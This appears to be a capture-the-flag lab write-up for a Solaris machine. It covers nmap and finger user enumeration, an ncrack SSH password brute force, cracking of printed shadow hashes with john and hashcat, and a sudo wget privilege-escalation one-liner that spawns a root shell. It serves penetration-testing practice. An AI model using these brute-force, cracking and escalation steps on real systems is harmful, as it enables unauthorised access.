## Title

### Lab Details 

- Difficulty: Easy 
- Type: Solaris 

#### Tasks

Q1: Which open TCP port is running the ```finger``` service?
 - nmap 10.10.10.76 -sT -A -T4 <!-- scanning for TCP -->
 
    ```
    ...
    PORT    STATE SERVICE VERSION
    79/tcp  open  finger?
    |_finger: No one logged on\x0D
    | fingerprint-strings: 
    |   GenericLines: 
    |     No one logged on
	...
    ```
  - nmap 10.10.10.76 -p- -A -T4 <!-- always good to scan full ports --> 
  
 
Q2: How many users can be found by enumerating the finger service? Considered as user if shown as pts.
  - Use finger-user-enum.pl perl script by pentestmonkey to enumerate for users 
  - Or Metasploit's module `auxiliary/scanner/finger/finger_users`
 -  https://github.com/pentestmonkey/finger-user-enum/blob/master/finger-user-enum.pl
```
...
sammy@10.10.10.76: sammy           ???            ssh          <May  6 07:35> 10.10.14.68         ..
sunny@10.10.10.76: sunny           ???            ssh          <Apr 13, 2022> 10.10.14.13         ..
...
``` 

Q3: What is the password for the sunny user on Sunday (The machine)?
- Found ssh port is 22022 and no other info on the user -> brute force
```
22022/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.4 (protocol 2.0) 
```
- Used ncrack with rockyou.txt
```
ncrack -vv  --user sunny -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.76:22022

Starting Ncrack 0.7 ( http://ncrack.org ) at 2025-05-14 20:18 AEST

Discovered credentials on ssh://10.10.10.76:22022 'sunny' 'sunday'
```

Q4: What is the password for sammy 
 - A folder named backup can be found on (/) root folder 
 - A file named shadow.backup resides in the folder which contains sunny and sammy's SHA256 password hash
 - Can use john or hashcat to crack
 - hashcat will require both shadow.backup as well /etc/passwd and unshadow will need to be run against the files
 ```hashcat
    ##### Crack /etc/shadow 
    - Requires unshadow of /etc/passwd and /etc/shadow
    - Command: unshadow passwd shadow > hash
    - Command: hashcat -m 7400 hash /usr/share/wordlists/rockyou.txt

    Content of /etc/shadow 
    sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
    sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```
 - John does not require unshadow to be run 
```
##### Brute forcing /etc/shadow
- john ./shadow.backup --wordlist=/usr/share/wordlists/rockyou.txt 
    /etc/shadow
    sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
    sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

Q5: What is flag located in sammy's home directory 
 - cat user.txt

Q6: What is the full path of the binary that user sunny can run with sudo privileges?
 - /root/troll

Q7: What is the complete path of the binary that user sammy can run with sudo privileges?
 - /usr/bin/wget

Q8: Submit the flag located in root's home directory.
- https://gtfobins.github.io/gtfobins/wget/
- since sammy is able to run wget as sudo without password then we can attempt to escalate the privilege by using wget
```
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
sudo wget --use-askpass=$TF 0
```


### Post Exploitation Note - Lesson Learned 

 - Always good to scan for all ports as `nmap -O -T4` or `nmap -sT -A -T4` does not scan for all ports which caused some ports to be missed during the initial enumeration.
 - As Q4 requires RCE for this machine and the first nmap only outputs 3 ports
```
map 10.10.10.76 -O -T4    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-14 19:30 AEST
Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 44.37% done; ETC: 19:30 (0:00:16 remaining)
Nmap scan report for 10.10.10.76
Host is up (0.28s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE
79/tcp  open  finger
111/tcp open  rpcbind
515/tcp open  printer
```
